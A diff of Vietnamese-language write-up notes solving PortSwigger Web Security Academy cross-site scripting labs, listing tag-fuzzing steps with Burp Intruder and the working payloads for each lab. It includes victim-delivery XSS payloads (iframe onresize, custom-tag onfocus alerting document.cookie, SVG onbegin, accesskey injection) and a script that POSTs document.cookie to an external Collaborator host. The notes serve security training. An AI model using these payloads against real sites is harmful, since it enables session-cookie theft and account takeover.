@@ -55,18 +55,39 @@ Giair thích: với dấu `"` hệ thống sẽ chèn `\` vào trước, và vì
 File này dùng hàm `replace` để xóa các kí tự `<` và `>` nhưng lỗ hổng của hàm này là chỉ replace các kí tự đầu tiên được tìm kiếm nên ta có payload: `<><img src=x onerror=alert(1)>`
 
 14. Reflected XSS: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked\
+Thử với `<script>alert('1');</script>` thì nhận được: `"Tag is not allowed"` và nhiều tag khác\
+Dùng `https://portswigger.net/web-security/cross-site-scripting/cheat-sheet` để tạo payload dùng tất cả các tag, đưa vào intruder:\
+![alt text](image-11.png)\
+![alt text](image-12.png)\
+Dùng `body`, tạo payload với attribute:\
+![alt text](image-13.png)\
+![alt text](image-14.png)\
+*Hoặc nếu lười hơn bạn có thể copy tất cả payload để thử.*\
+Tiếp tục tạo payload gửi victim: `<iframe src="https://id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width=1>`
 
+15. Reflected XSS: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked\
+Bài này block hết tất cả tag ở bài trước, ta vẫn thử fuzzing bằng payload và nhận được khá nhiều request có 200 nhưng lại không thể `alert()` được dù vẫn thực hiện tag đó, chỉ có trường hợp là: `<a2 onfocus=alert(1) autofocus tabindex=1>` thì có thể `alert` nên ta dùng để viết payload gửi victim:``<script>
+location= 'https://0af4001203d37e4280f56cba00c600af.web-security-academy.net/?search=%3caudio2%20onfocus%3dalert(document.cookie)%20autofocus%20tabindex%3d1%3e';
+</script>``
+
+16. Reflected XSS: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed\
+Dùng intruder tương tự tìm kiếm tag và event hợp lệ, payload: `<svg><animatetransform+onbegin%3Dalert(1)>`
+
+17. Reflected XSS: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag\
+Tìm hiểu về canonical link tag ta biết có thể dùng phím ấn để gọi lệnh Javascript, payload: `https://0ab60079038ae8b88043080f0096000e.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`
+
+18. Reflected XSS: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped\
 
 
 Lab: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies\
-```js
-<script>
-    fetch('https://ebty5bf18db9t8dai0aew74c83eu2lqa.oastify.com', {
-    method: 'POST',
-    mode: 'no-cors',
-    body:document.cookie
-    });
-</script>
-```
-
+    ```js
+    <script>
+        fetch('https://ebty5bf18db9t8dai0aew74c83eu2lqa.oastify.com', {
+        method: 'POST',
+        mode: 'no-cors',
+        body:document.cookie
+        });
+    </script>
+    ```
+    ![alt text](image-15.png)
 
